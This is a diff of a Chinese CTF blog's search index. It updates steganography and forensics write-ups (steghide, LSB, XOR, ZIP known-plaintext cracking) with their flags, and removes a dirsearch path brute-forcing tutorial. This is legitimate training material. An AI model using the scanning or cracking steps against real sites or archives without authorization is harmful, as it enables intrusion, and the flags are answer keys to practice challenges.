RmcGJmaHR2aXdsYXVlb2dwcG1qc3BjYWxmaGNhcmtsYmlzcGh0anBhbmhsaXNwbnRza2tjbGpnZ2tjenRmaG5lY25wdGlmZnRyZG10amZla2ZpdGthc2RnbmVscHVoYmZpbXB1Y2JrcGtjbXhsZmtwaWlqdmh0amtzeWx6cm9vZmFjeGNscGpuaGJpcmN5ZGp0Y2xqZG9ibHlyeW1hdGdoaWZvam1qanNla29vbW9mY2FjdGF2ZmN5Zm11Znhoc3Rqd3VwYmpreW9nbnlyeXBseXBxbGF5eW1veHRhbnFkcHVyYnd6cGxsb2traGhtYW5kam5hdGNibGtjb3Rna2x1dHR3YmRhdHFybWF6cHJ2YXd6anhlZmhqdGRraWt1cmxsY2xjam9naG1sd3RhbWRkY2NucXVyb3Jha2N5b2JsYXJ6YWNtbnFjbWV0dHVheWF1eWl2c21ma25uYW5sdGNtaWdmcmdhYmlwdG50aG1tdXRwaWJ5bHJhdGhqY2doY2ZtbG92cGNudHFwZW96bG90ZGtlaW9jZmtjaXZ1eWx6Ympvb3hjc2FjbmdkdXZ4dG50aGphZXBhdX1rbGFocGNtdnppY2twYWFwaG9jZ2lvZ2p0dnB0Z2poZG9udW5scGFvbG5kcWJxZmRtYnBqam94Ym9tbGlreXVpcG54cXh6Y2lmb3JhaGhldXl5dHpoanV0Z2Z3dHVscmpjZnhvaWFneWpmYnBqaWFrZ3l0eGJmbnBsZnBxd3RkaXFuaXR2dmF1amRqbGlmamlvcnltdmZ4bXhnb3JpY3ljZGZob2ZiYnlnZmxhdGlyamRpZGFkcXZpa2pvY2l5ZmR6aHJvZ255eWlia2dubnZobWpsb2xhdndmaWpjZ2dma3B0a3BnY3FmYWZheXNpdHltYWN2a3FweWxoaGJ1Ymh4c2x1emN5dmxvcmlwdGxwZmxjdWljcG5mc2hpeXh2a2tiY2p5dWtvdGFsZmNpcGhjZGd4aWZ0a2xkZ29wanNtdXJ0eWp5cGhia2JmbmJ3YnNvZmlheHRsdWhwbXJmZGFrdWx1cGVhcHZyeXhtYWVwaGF5bmV4emZsbmV2am1pYndvcml0aGh4YmJ5cG1tYWJvYmZuZmNvanR0Y3Jram1naXJ2bWlzdW5mbHVodGVudHJodGVvamtjaGtwZnBhZXNnd2dscWRrdnZudWx1bnF7bG1sdGFscGhvdWZqcGlhbGNmbGZ5ZHZmd3lkb2ZraGFpeWF3bGx3Y2pvYXJxdnpqbGZmZ2xjdGNsYmxwa2JzZmxocnRqZGFvd3ByZGJjdWJmbHlveWJodmh3ZndvZWl0Z254YnpuaWZwbGx4bXN0a251aWhvYmZlZWZra2FreW5uYWNra2NkdWFtZ3N2bnBoY3RmZ3NybnJvZWh2ZW5kYmZpb21xZm14Ym1paWl1bGF2b2dma2dhY2lrYWFtcHBybGpmbXBqY3VhYXNja2l1cWlmY2liamx1dGNtcGF0b2pyanZmeGdsenBvcGpkZ2NoanVqbGtuZnd0cG5qZnBhY3JrcHRmaGNzamdyaXBjcmZjZGFsem5ob25mZGNvaG9zZmhvaGVha250aXRtamZsbmJvcGNsY3hjdWlnb3hja3JiYWxyYWVidGFhcml0ZWZtemNxaWRvZmd0ZnFnYmFkaWNubWhvdGlvbm9iZnlubGdvenRkYXZ2aW14b2JvdGlra2Z4d2lyb3JwZmNjdXpob3BoZmRjaWVrY2p5b21lamtjZ2Zmam51bmhvcGFkdGZndG1sdA==</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -62,12 +245,12 @@
 <li>异或处理</li>
 </ul>
 <h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>音频没有办法打开，显示异常，用010查看</p>
-<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313154611541.png"></p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313154611541.png"></p>
 <p>发现根本不符合格式</p>
-<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313154714073.png"></p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313154714073.png"></p>
 <p>多次出行相同的字符，猜测是进行了异或，<code>工具-&gt;十六进制运算-&gt;二进制异或</code></p>
 <p>全文进行异或后得到正确文件</p>
-<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313154858601.png"></p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313154858601.png"></p>
 <p>得到flag：<code>actfabcdfghijk</code></p>
 <h1 id="Misc5"><a href="#Misc5" class="headerlink" title="Misc5"></a>Misc5</h1><p>[ACTF新生赛2020]wget</p>
 <h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul>
@@ -106,14 +289,12 @@
 </ul>
 <h2 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h2><p>两个文件一个要密码的压缩包，匀称？猜测高度有问题</p>
 <p>使用工具TweakPNG查看，发现有报错</p>
-<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313165532165.png"></p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313165532165.png"></p>
 <p>用010打开图片修改</p>
-<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313170605117.png"></p>
-
-
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313170605117.png"></p>
 <p>得到：<strong>you come</strong>。解压得到图片</p>
 <p>猜测LSB隐写</p>
-<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313171718397.png"></p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313171718397.png"></p>
 <p>得到flag：**<code>ACTF&#123;llL llsb_i3_e3asY&#125;</code>**</p>
 <h1 id="Misc-8"><a href="#Misc-8" class="headerlink" title="Misc 8"></a>Misc 8</h1><p>[ACTF新生赛2020]剑龙</p>
 <h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul>
@@ -128,10 +309,10 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">welcom3!</span><br></pre></td></tr></table></figure>
 
 <p>在图片信息中可以看</p>
-<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313172549463.png"></p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313172549463.png"></p>
 <p>key：<code>**@#$%^&amp;%%$)**</code></p>
 <p>hh.jpg是<strong>steghide</strong>隐写</p>
-<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313183441314.png"></p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313183441314.png"></p>
 <figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">U2FsdGVkX1/7KeHVl5984OsGUVSanPfPednHpK9lKvp0kdrxO4Tj/Q==</span><br></pre></td></tr></table></figure>
 
 <p><a href="https://www.sojson.com/encrypt_des.html">DES解密</a></p>
@@ -140,7 +321,7 @@
 <p>运行命令</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./stegosaurus -x O_O.pyc </span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313190100195.png"></p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313190100195.png"></p>
 <p>得到flag：**<code>flag&#123;3teg0Sauru3_!1&#125;</code>**</p>
 <h1 id="Misc-9"><a href="#Misc-9" class="headerlink" title="Misc 9"></a>Misc 9</h1><p>[ACTF新生赛2020]明文攻击</p>
 <h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul>
@@ -148,13 +329,13 @@
 </ul>
 <h2 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h2><p>提示明文攻击</p>
 <p>先看图片，在图片尾有flag.txt，补上<code>50 4B</code></p>
-<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313202715767.png"></p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313202715767.png"></p>
 <p>新建成压缩包</p>
 <p>对比两个包</p>
-<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313203046943.png"></p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313203046943.png"></p>
 <p>两个包的CRC是一样的</p>
 <p>进行爆破</p>
-<p><img src="/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/image-20220313203155571.png"></p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313203155571.png"></p>
 <h1 id="Misc-10"><a href="#Misc-10" class="headerlink" title="Misc 10"></a>Misc 10</h1><p>[ACTF新生赛2020]近在眼前</p>
 <h2 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>base64隐写</li>
@@ -167,6 +348,94 @@
 ]]></content>
       <categories>
         <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>每日Misc一</title>
+    <url>/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/</url>
+    <content><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>今日刷题</p>
+<span id="more"></span>
+
+<h2 id="UTCTF2020-File-Carving"><a href="#UTCTF2020-File-Carving" class="headerlink" title="[UTCTF2020]File Carving"></a>[UTCTF2020]File Carving</h2><p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/attachment-20220323155255-weuysoa.png"></p>
+<p>一张图片</p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h3><ul>
+<li>文件分离</li>
+<li>ELF文件</li>
+</ul>
+<p>命令：file、binwalk、foremost</p>
+<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>文件题目是file carving</p>
+<p>第一时间kali查看文件，发现有其他文件，进行文件分离</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323171906-ruminau.png"></p>
+<p>分离文件中有压缩包，解压得到文件</p>
+<p>使用file命令发现是ELF文件，运行得到flag</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323172027-8sps4f5.png"></p>
+<h2 id="INSHack2017-sanity"><a href="#INSHack2017-sanity" class="headerlink" title="[INSHack2017]sanity"></a>[INSHack2017]sanity</h2><p>签到题</p>
+<p>下载解压查看</p>
+<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Challenge description:</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">I really hope you are INSAne, but if that&#x27;s not the case </span></span><br><span class="line"><span class="attribute">and that you don&#x27;t want to validate the &quot;INSAnity&quot; challenge </span></span><br><span class="line"><span class="attribute">then maybe you would like to validate this one? </span></span><br><span class="line"><span class="attribute">Here is your flag, you disapointing and boring fellow</span><span class="punctuation">: </span></span><br><span class="line">INSA&#123;Youre_sane_Good_for_you&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="GUET-CTF2019-soul-sipse"><a href="#GUET-CTF2019-soul-sipse" class="headerlink" title="[GUET-CTF2019]soul sipse"></a>[GUET-CTF2019]soul sipse</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a><strong>知识点</strong></h3><ul>
+<li>Steghide隐写</li>
+<li>png文件头</li>
+<li>unicode编码</li>
+</ul>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>音频隐写的方式，但是没有密码或者Key。文件分离，也没有发现。听，也没有发现什么信息。</p>
+<p>想到<code>Steghide</code>是一个可以将文件隐藏到图片或音频中的工具，使用命令：<code>steghide extract -sf out.wav </code>（无密码）</p>
+<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">┌──(root💀kali)-[~/桌面/CTF/MISC]</span></span><br><span class="line"><span class="attribute">└─# steghide extract -sf out.wav </span></span><br><span class="line"><span class="attribute">Enter passphrase</span><span class="punctuation">: </span></span><br><span class="line">wrote extracted data to &quot;download.txt&quot;.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>查看文件得到一个网址：<a href="https://share.weiyun.com/5wVTIN3">https://share.weiyun.com/5wVTIN3</a></p>
+<p>打开网站。下载得到图片</p>
+<p>图片损坏不能正常显示，用010查看文件，文件头错误 </p>
+<p><code>89 50 4E 47</code></p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323174648-aruer40.png"></p>
+<p>打开得到编码</p>
+<p><code>\u0034\u0030\u0037\u0030\u000d\u000a\u0031\u0032\u0033\u0034\u000d\u000a</code></p>
+<p>unicode解码得到</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323174925-skni7fq.png"></p>
+<p>经过尝试，把两个数字相加，出题人鬼才，得到flag{5304}</p>
+<h2 id="BUUCTF-voip"><a href="#BUUCTF-voip" class="headerlink" title="BUUCTF voip"></a>BUUCTF voip</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>流量包分析</li>
+<li>voip通话</li>
+</ul>
+<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>打开流量包</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323184625-tpa6e7y.png"></p>
+<p>在voip通话之中有英语听力，flag就在里面。考听力。</p>
+<p> flag{9001IVR}</p>
+<h2 id="BUUCTF-Business-Planning-Group"><a href="#BUUCTF-Business-Planning-Group" class="headerlink" title="BUUCTF Business Planning Group"></a>BUUCTF Business Planning Group</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>BPG图片</li>
+<li>图片隐写</li>
+<li>base64编码</li>
+</ul>
+<h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>得到图片</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/challenge-20220323191325-4k6iank.png"></p>
+<p>用binwalk、foremost 也没得到有用的信息。</p>
+<p>在010查看发现文件尾有个BPG</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323192137-vmw1qbm.png"></p>
+<p><strong>维基百科</strong></p>
+<p><strong>BPG</strong>格式，全称“<strong>Better Portable Graphics</strong>”（更好的便携式图像），它是一个声称比现时最流行的<a href="https://zh.wikipedia.org/wiki/JPEG" title="JPEG">JPEG</a>压缩格式更优秀的<a href="https://zh.wikipedia.org/wiki/%E5%9B%BE%E5%83%8F%E5%8E%8B%E7%BC%A9" title="图像压缩">图像压缩</a>方案，由法国的程序员<a href="https://zh.wikipedia.org/wiki/%E6%B3%95%E5%B8%83%E9%87%8C%E6%96%AF%C2%B7%E8%B4%9D%E6%8B%89" title="法布里斯·贝拉">法布里斯·贝拉</a>（Fabrice Bellard）于2014年创建。他将影像编码格式中的技术运用到了图像编码，以达至更理想的压缩比率，而不同于<a href="https://zh.wikipedia.org/wiki/JPEG" title="JPEG">JPEG</a>为提高压缩比而牺牲画质的方式 ^<a href="https://zh.wikipedia.org/wiki/BPG#cite_note-bellard-1">[1]</a>^^<a href="https://zh.wikipedia.org/wiki/BPG#cite_note-techbang-2">[2]</a>^ 。该影像编码格式基于<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E6%95%88%E7%8E%87%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81" title="高效率视频编码">高效率视频编码</a>（HEVC）的<a href="https://zh.wikipedia.org/wiki/%E5%B9%80%E5%85%A7%E7%B7%A8%E7%A2%BC" title="帧内编码">帧内编码</a>技术改良而成。</p>
+<p><strong>BPG (Better Portable Graphics)</strong> 是一个新的图片格式，目的是保证质量或者文件大小限制的情况下替换 JPEG 格式，主要特性：</p>
+<ul>
+<li>高压缩率</li>
+<li>支持大部分 Web 浏览器，带有一个小的 JavaScript 解码器 (gzipped size: 56 KB).</li>
+<li>基于 <a href="http://en.wikipedia.org/wiki/High_Efficiency_Video_Coding">HEVC</a> 开放视频压缩标准的子集</li>
+<li>支持跟 JPEG 的相同色度(grayscale, YCbCr 4:2:0, 4:2:2, 4:4:4) ，降低转换损失</li>
+<li>原生支持每通道 8 到 14 位，更好的动态范围</li>
+<li>支持无损压缩</li>
+<li>各种元数据</li>
+<li>支持动态</li>
+</ul>
+<p>正常windows没有办法识别BPG</p>
+<p>用工具：<a href="https://bellard.org/bpg/bpg-0.9.8-win64.zip">https://bellard.org/bpg/bpg-0.9.8-win64.zip</a></p>
+<p>命令：<code>.\bpgview.exe .\1.bpg</code></p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323193906-tlc0e0a.png"></p>
+<p><code>YnNpZGVzX2RIbGhpe0JQR19pNV9iM3R0M3JfN2g0bl9KUEd9Cg==</code></p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323194144-o0hlquy.png"></p>
+<p>bsides_dHlhi{BPG_i5_b3tt3r_7h4n_JPG}</p>
+]]></content>
+      <categories>
+        <category>BUUCTF(Misc)</category>
       </categories>
       <tags>
         <tag>Misc</tag>
@@ -370,189 +639,6 @@
         <tag>web</tag>
         <tag>文件包含</tag>
         <tag>练习题</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dirsearch-路径扫描</title>
-    <url>/2022/dirsearch/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一款高级命令行工具，旨在暴力破解网络服务器中的目录和文件，AKA 网络路径扫描器。</p>
-<p>dirsearch进行高精度，可以扩展的扫描，可以根据自己的需求定义，相对于御剑，我个人认为更好点。</p>
-<p><a href="https://github.com/maurosoria/dirsearch">dirsearch工具地址</a></p>
-<span id="more"></span>    
-
-<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ul>
-<li>使用 git 安装：<code>git clone https://github.com/maurosoria/dirsearch.git</code></li>
-<li>使用 ZIP 文件安装：<a href="https://github.com/maurosoria/dirsearch/archive/master.zip">在此处下载</a></li>
-<li>使用 Docker 安装：（<code>docker build -t &quot;dirsearch:v0.4.1&quot;</code>更多<a href="https://github.com/maurosoria/dirsearch#support-docker">信息</a>）</li>
-<li>使用 Kali Linux 安装：<code>sudo apt-get install dirsearch</code></li>
-<li>使用 PyPi 安装：<code>pip3 install dirsearch</code></li>
-</ul>
-<p>安装库</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/maurosoria/dirsearch.git</span><br><span class="line">cd dirsearch</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">python3 dirsearch.py -u &lt;URL&gt; -e &lt;EXTENSIONS&gt;</span><br></pre></td></tr></table></figure>
-
-<p>requirements.txt 中包含了 dirsearch 中需要的库。</p>
-<h1 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage: dirsearch.py [-u|--url] target [-e|--extensions] extensions [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             显示程序的版本号并退出</span><br><span class="line">  -h, --<span class="built_in">help</span>            显示此帮助消息并退出</span><br><span class="line"></span><br><span class="line">  Mandatory: <span class="comment">#强制性的</span></span><br><span class="line">    -u URL, --url=URL   目标网址</span><br><span class="line">    -l FILE, --url-list=FILE</span><br><span class="line">                        目标URL列表文件</span><br><span class="line">    --stdin             来自STDIN的目标URL列表</span><br><span class="line">    --cidr=CIDR         目标CIDR</span><br><span class="line">    --raw=FILE          从文件加载原始HTTP请求 (use `--scheme` flag to <span class="built_in">set</span> the scheme)</span><br><span class="line">    -e EXTENSIONS, --extensions=EXTENSIONS</span><br><span class="line">                        用逗号分隔的扩展列表 (Example: php,asp)</span><br><span class="line">    -X EXTENSIONS, --exclude-extensions=EXTENSIONS</span><br><span class="line">                        排除由逗号分隔的扩展列表 (Example: asp,jsp)</span><br><span class="line">    -f, --force-extensions</span><br><span class="line">                        为每个单词列表条目添加扩展名。默认情况下dirsearch仅将%EXT%关键字替换为扩展</span><br><span class="line"></span><br><span class="line">  Dictionary Settings: <span class="comment">#字典设置</span></span><br><span class="line">    -w WORDLIST, --wordlists=WORDLIST</span><br><span class="line">                        自定义词表 (用逗号分隔)</span><br><span class="line">    --prefixes=PREFIXES</span><br><span class="line">                        向所有单词列表条目添加自定义前缀 (用逗号分隔)</span><br><span class="line">    --suffixes=SUFFIXES</span><br><span class="line">                        向所有单词列表条目添加自定义后缀，忽略目录(用逗号分隔)</span><br><span class="line">    --only-selected     删除路径与选定路径具有不同的扩展名通过`-e的` (保留条目没有扩展名)</span><br><span class="line">    --remove-extensions</span><br><span class="line">                        删除所有路径中的扩展 (Example: admin.php -&gt; admin)</span><br><span class="line">    -U, --uppercase     Uppercase wordlist</span><br><span class="line">    -L, --lowercase     Lowercase wordlist</span><br><span class="line">    -C, --capital       Capital wordlist</span><br><span class="line"></span><br><span class="line">  General Settings: <span class="comment">#一般设置</span></span><br><span class="line">    -t THREADS, --threads=THREADS  线程数</span><br><span class="line">    -r, --recursive     暴力循环</span><br><span class="line">    --deep-recursive    对每个目录深度执行递归扫描</span><br><span class="line">                        (Example: api/users -&gt; api/)</span><br><span class="line">    --force-recursive   对每个找到的路径进行递归暴力，而不是只有路径以斜线结尾</span><br><span class="line">    --recursion-depth=DEPTH 最大递归深度</span><br><span class="line">    --recursion-status=CODES</span><br><span class="line">                        执行递归扫描的有效状态代码，支持范围 (用逗号分隔)</span><br><span class="line">    --subdirs=SUBDIRS   扫描给定URL的子目录 (用逗号分隔)</span><br><span class="line">    --exclude-subdirs=SUBDIRS</span><br><span class="line">                        在递归过程中排除以下子目录扫描 (用逗号分隔)</span><br><span class="line">    -i CODES, --include-status=CODES</span><br><span class="line">                        包括状态代码，用逗号分隔，支持范围 (Example: 200,300-399)</span><br><span class="line">    -x CODES, --exclude-status=CODES</span><br><span class="line">                        排除状态代码，用逗号分隔，支持范围 (Example: 301,500-599)</span><br><span class="line">    --exclude-sizes=SIZES</span><br><span class="line">                        按大小排除响应，以逗号分隔 (Example: 123B,4KB)</span><br><span class="line">    --exclude-texts=TEXTS</span><br><span class="line">                        按文本排除回复，用逗号分隔 (Example: <span class="string">&#x27;Not found&#x27;</span>, <span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line">    --exclude-regexps=REGEXPS</span><br><span class="line">                        通过regexp排除响应，用逗号分隔</span><br><span class="line">                        (Example: <span class="string">&#x27;Not foun[a-z]&#123;1&#125;&#x27;</span>, <span class="string">&#x27;^Error$&#x27;</span>)</span><br><span class="line">    --exclude-redirects=REGEXPS</span><br><span class="line">                        通过重定向正则表达式或文本排除响应,</span><br><span class="line">                        用逗号分隔 (Example: <span class="string">&#x27;https://okta.com/*&#x27;</span>)</span><br><span class="line">    --exclude-content=PATH</span><br><span class="line">                        按此路径的响应内容排除响应</span><br><span class="line">    --skip-on-status=CODES</span><br><span class="line">                        无论何时命中其中一个状态码，跳过目标，用逗号分隔，支持范围</span><br><span class="line">    --minimal=LENGTH    最小响应长度</span><br><span class="line">    --maximal=LENGTH    最大响应长度</span><br><span class="line">    --max-time=SECONDS  扫描的最大运行时间</span><br><span class="line">    -q, --quiet-mode    安静模式</span><br><span class="line">    --full-url          输出中的完整URL (在中自动启用安静模式)</span><br><span class="line">    --no-color          没有彩色输出</span><br><span class="line"></span><br><span class="line">  Request Settings: <span class="comment">#请求设置</span></span><br><span class="line">    -m METHOD, --http-method=METHOD HTTP方法 (default: GET)</span><br><span class="line">    -d DATA, --data=DATA HTTP请求数据</span><br><span class="line">    -H HEADERS, --header=HEADERS</span><br><span class="line">                        HTTP请求头，支持多个标志 (Example:</span><br><span class="line">                        -H <span class="string">&#x27;Referer: example.com&#x27;</span>)</span><br><span class="line">    --header-list=FILE  文件包含HTTP请求头</span><br><span class="line">    -F, --follow-redirects</span><br><span class="line">                        遵循HTTP重定向</span><br><span class="line">    --random-agent      为每个请求选择一个随机用户代理</span><br><span class="line">    --auth-type=TYPE    身份验证类型 (basic, digest, bearer, ntlm)</span><br><span class="line">    --auth=CREDENTIAL   认证凭证 (user:password or bearer token)</span><br><span class="line">    --user-agent=USERAGENT</span><br><span class="line">    --cookie=COOKIE</span><br><span class="line"></span><br><span class="line">  Connection Settings: <span class="comment">#连接设置</span></span><br><span class="line">    --<span class="built_in">timeout</span>=TIMEOUT   连接超时</span><br><span class="line">    -s DELAY, --delay=DELAY</span><br><span class="line">                        请求之间的延迟</span><br><span class="line">    --proxy=PROXY       代理URL，支持HTTP和SOCKS代理 (Example:</span><br><span class="line">                        localhost:8080, socks5://localhost:8088)</span><br><span class="line">    --proxy-list=FILE   文件包含代理服务器</span><br><span class="line">    --replay-proxy=PROXY</span><br><span class="line">                        要使用找到的路径重播的代理</span><br><span class="line">    --scheme=SCHEME     默认方案 (对于原始请求或如果没有URL中的方案)</span><br><span class="line">    --max-rate=RATE     每秒最大请求数</span><br><span class="line">    --retries=RETRIES   失败请求的重试次数</span><br><span class="line">    -b, --request-by-hostname</span><br><span class="line">                        默认情况下，通过IP搜索速度请求。这将强制dirsearch按主机名请求</span><br><span class="line">    --ip=IP             服务器IP地址</span><br><span class="line">    --exit-on-error     每当发生错误时退出</span><br><span class="line"></span><br><span class="line">  Reports:</span><br><span class="line">    -o FILE, --output=FILE</span><br><span class="line">                        输出文件</span><br><span class="line">    --format=FORMAT     报告格式 (Available: simple, plain, json, xml,</span><br><span class="line">                        md, csv, html)</span><br></pre></td></tr></table></figure>
-
-<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>dirsearch 工具可以根据自己的需求进行配置，配置文件为 default.conf 。选择带 <code>#</code> 的进行配置。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># If you want to edit dirsearch default configurations, you can</span><br><span class="line"># edit values in this file. Everything after `#` is a comment</span><br><span class="line"># and won&#x27;t be applied</span><br><span class="line"></span><br><span class="line">[mandatory]</span><br><span class="line">default-extensions = php,aspx,jsp,html,js</span><br><span class="line">force-extensions = False</span><br><span class="line"># exclude-extensions = old,log</span><br><span class="line"></span><br><span class="line">[general]</span><br><span class="line">threads = 30</span><br><span class="line">recursive = False</span><br><span class="line">deep-recursive = False</span><br><span class="line">force-recursive = False</span><br><span class="line">recursion-depth = 0</span><br><span class="line">exclude-subdirs = %%ff/</span><br><span class="line">random-user-agents = False</span><br><span class="line">max-time = 0</span><br><span class="line">full-url = False</span><br><span class="line">quiet-mode = False</span><br><span class="line">color = True</span><br><span class="line">recursion-status = 200-399,401,403</span><br><span class="line"># include-status = 200-299,401</span><br><span class="line"># exclude-status = 400,500-999</span><br><span class="line"># exclude-sizes = 0b,123gb</span><br><span class="line"># exclude-texts = &quot;Not found&quot;</span><br><span class="line"># exclude-regexps = &quot;403 [a-z]&#123;1,25&#125;&quot;</span><br><span class="line"># exclude-content = 404.html</span><br><span class="line"># skip-on-status = 429,999</span><br><span class="line"></span><br><span class="line">[reports]</span><br><span class="line">report-format = plain</span><br><span class="line">autosave-report = True</span><br><span class="line"># report-output-folder = /home/user</span><br><span class="line"># logs-location = /tmp</span><br><span class="line">## Supported: plain, simple, json, xml, md, csv, html</span><br><span class="line"></span><br><span class="line">[dictionary]</span><br><span class="line">lowercase = False</span><br><span class="line">uppercase = False</span><br><span class="line">capitalization = False</span><br><span class="line"># prefixes = .,admin</span><br><span class="line"># suffixes = ~,.bak</span><br><span class="line"># wordlist = db/dicc.txt</span><br><span class="line"></span><br><span class="line">[request]</span><br><span class="line">httpmethod = get</span><br><span class="line">## Lowercase only</span><br><span class="line">follow-redirects = False</span><br><span class="line"># headers-file = headers.txt</span><br><span class="line"># user-agent = MyUserAgent</span><br><span class="line"># cookie = SESSIONID=123</span><br><span class="line"></span><br><span class="line">[connection]</span><br><span class="line">timeout = 5</span><br><span class="line">delay = 0</span><br><span class="line">scheme = http</span><br><span class="line">maxrate = 0</span><br><span class="line">retries = 2</span><br><span class="line">request-by-hostname = False</span><br><span class="line">exit-on-error = False</span><br><span class="line"># proxy = localhost:8080</span><br><span class="line"># proxy-list = proxies.txt</span><br><span class="line"># replay-proxy = localhost:8000</span><br></pre></td></tr></table></figure>
-
-<h1 id="命令-使用"><a href="#命令-使用" class="headerlink" title="命令-使用"></a>命令-使用</h1><h2 id="简单扫描"><a href="#简单扫描" class="headerlink" title="简单扫描"></a>简单扫描</h2><p>对 URL 进行扫描</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u https://target</span><br></pre></td></tr></table></figure>
-
-<p>扫描固定后缀文件的 URL</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target</span><br></pre></td></tr></table></figure>
-
-<p>定义字典扫描</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist</span><br></pre></td></tr></table></figure>
-
